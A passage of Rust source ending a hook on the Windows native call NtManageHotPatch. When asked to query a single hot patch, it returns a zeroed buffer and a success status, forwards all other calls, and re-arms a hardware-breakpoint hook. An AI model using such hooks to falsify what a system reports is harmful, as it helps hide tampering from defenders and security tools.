    let NtManageHotPatch: extern "system" fn(usize,usize,usize,usize) -> usize = std::mem::transmute(GetProcAddress(ntdll_handle,s!("NtManageHotPatch")).unwrap() as *const ());
    let mut status:NTSTATUS = 0;
    if HotPatchInformationClass == ManageHotPatchQuerySinglePatch {
        ptr::write_bytes(HotPatchInformation,0,HotPatchInformationLength as usize);
        if ReturnLength != std::ptr::null_mut() {
            *ReturnLength = 0
        }
    } else {
        status = NtManageHotPatch(HotPatchInformationClass as usize,HotPatchInformation as usize,HotPatchInformationLength as usize,ReturnLength as usize) as NTSTATUS;
        NtManageHotPatch_hwbp.enable(true);
    }
    status
}